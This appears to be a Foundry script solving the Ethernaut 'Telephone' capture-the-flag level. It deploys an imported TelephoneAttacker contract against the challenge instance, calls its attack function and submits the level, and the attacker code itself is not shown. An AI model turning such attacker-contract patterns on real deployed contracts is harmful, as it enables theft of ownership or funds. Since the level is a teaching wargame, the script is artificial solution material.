// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {TelephoneAttacker} from "../../src/04-TelephoneAttacker.sol";

contract TelephoneSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        TelephoneAttacker telephoneAttacker = new TelephoneAttacker(challengeInstance);
        telephoneAttacker.attack();


        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(4));
    }
}
